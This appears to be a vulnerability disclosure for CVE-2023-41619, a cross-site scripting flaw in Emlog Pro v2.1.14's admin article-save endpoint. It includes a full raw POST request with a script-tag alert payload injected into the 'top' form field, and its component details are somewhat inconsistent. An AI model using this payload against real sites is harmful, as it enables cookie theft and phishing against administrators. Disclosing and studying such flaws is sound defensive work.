CVE-2023-41619
[Discoverer]:yunda&haozhe
[NAME OF AFFECTED PRODUCT(S)] :https://github.com/emlog/emlog
[AFFECTED AND/OR FIXED VERSION(S)] : https://github.com/emlog/emlog - pro2.1.14
[Affected Component] :/admin/article_save.php  The code directory that causes the vulnerability is allow_remark
Emlog Pro v2.1.14 was discovered to contain a cross-site scripting (XSS) vulnerability via the component /admin/article.php?action=write.
[ Vulnerability Type]:Cross Site Scripting (XSS)
[Impact]:Stealing client cookies or engaging in phishing scams.

Method of reproducing vulnerabilities
 After deploying the local environment, modify the passed data by building the following special post request, causing an xss  vulnerability under the page of the post function POST

[Attack Vectors]
POST /admin/article_save.php HTTP/1.1
Host: ip
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------358887212836791494383304344370
Content-Length: 2074
Origin: http://ip
Connection: close
Referer: http://ip/admin/article.php?action=write
Cookie: PHPSESSID=dshd33ains2pqbjnl3q5cpmt71; EM_AUTHCOOKIE_WcMyRFTr3IAQMktGtnRdKvQ5GgXSIJbp=admin%7C0%7Cb7406e5b7d1a48c29fbcd2c1e8018db7; em_saveLastTime=1693271953611; EM_AUTHCOOKIE_RW7gl0RhrCSq5tduV3PX1bkgGb7i9zaV=admin%7C0%7Cd38fae6abe8bbecb0e8310233a726d6c
Upgrade-Insecure-Requests: 1

-----------------------------358887212836791494383304344370
Content-Disposition: form-data; name="title"

123
 ------------------------


The URL contains xss vulnerability, which is triggered when the request content of the construction is below. I deployed the cms to replicate and found that the administrator interface part contains reflective xss
192.168.11.12 is the target host
[Affected Component]ï¼šContent-Disposition: form-data; name="top"

for example:
> POST /admin/article_save.php HTTP/1.1 Host: 192.168.11.12 User-Agent:
> Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
> Accept-Language:
> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
> Accept-Encoding: gzip, deflate Content-Type: multipart/form-data;
> boundary=---------------------------259833844422639348651986471669
> Content-Length: 2074 Origin: http://192.168.11.12 Connection: close
> Referer: http://192.168.11.12/admin/article.php?action=write Cookie:
> PHPSESSID=dshd33ains2pqbjnl3q5cpmt71;
> EM_AUTHCOOKIE_WcMyRFTr3IAQMktGtnRdKvQ5GgXSIJbp=admin%7C0%7Cb7406e5b7d1a48c29fbcd2c1e8018db7;
> em_saveLastTime=1693277423289;
> EM_AUTHCOOKIE_RW7gl0RhrCSq5tduV3PX1bkgGb7i9zaV=admin%7C0%7Cd38fae6abe8bbecb0e8310233a726d6c
> Upgrade-Insecure-Requests: 1
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="top"
> y'"()&%<acx><ScRiPt >alert(123)</ScRiPt>
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="title"
> top -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="logcontent"
> 123 -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="logexcerpt"
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="ishide"
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="as_logid"
> -1 -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="gid"
> -1 -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="author"
> 1 -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="pubPost"
> ???? -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="cover"
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="upload_img"; filename=""
> Content-Type: application/octet-stream
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="sort"
> -1 -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="tag"
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="postdate"
> 2023-08-22 04:16
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="allow_remark"
> y -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="alias"
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="link"
> -----------------------------259833844422639348651986471669
> Content-Disposition: form-data; name="password"
> -----------------------------259833844422639348651986471669--
